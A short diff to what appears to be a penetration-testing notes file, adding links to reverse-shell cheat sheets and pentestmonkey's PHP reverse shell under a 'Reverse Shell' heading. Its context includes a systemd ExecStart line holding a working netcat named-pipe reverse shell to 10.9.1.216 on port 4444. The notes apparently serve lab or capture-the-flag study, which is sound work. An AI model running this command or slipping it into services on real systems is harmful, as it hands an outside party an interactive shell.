@@ -12,9 +12,13 @@
 ## Reverse Shell ##
 [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
+[PenTestMonkey: Raw Rev Shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
+
 [PenTestMonkey: Reverse Shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 
 [PenTestMonkey: TTY](http://pentestmonkey.net/blog/post-exploitation-without-a-tty)
+
+[Swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)
 
 ExecStart=/bin/sh -c " rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.216 4444 >/tmp/f"
 
